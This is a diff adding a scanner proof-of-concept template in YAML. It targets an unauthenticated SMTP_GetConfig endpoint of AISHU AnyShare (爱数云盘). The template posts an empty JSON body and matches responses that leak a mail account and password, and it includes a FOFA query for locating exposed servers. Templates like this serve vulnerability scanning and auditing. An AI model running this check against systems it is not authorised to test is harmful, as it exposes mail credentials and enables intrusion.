@@ -1,0 +1,18 @@
+id: poc-yaml-anyshare-smtp-getconfig-info-leak
+info:
+  name: 爱数云盘 SMTP_GetConfig 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: anyshare
+  fofa: app="AISHU-AnyShare"
+requests:
+- method: POST
+  path: /api/ShareMgnt/SMTP_GetConfig
+  headers:
+    Content-Type: application/json
+  data: '{}'
+  expression: status_code == 200 && matches(body,`"email":\s*"([\w\.\-]+)@([\w\.\-]+)"`)
+    && contains(body,"\"password\":") && !contains(body,"null") && contains(content_type,"application/json")
+variables: {}
+transport: http
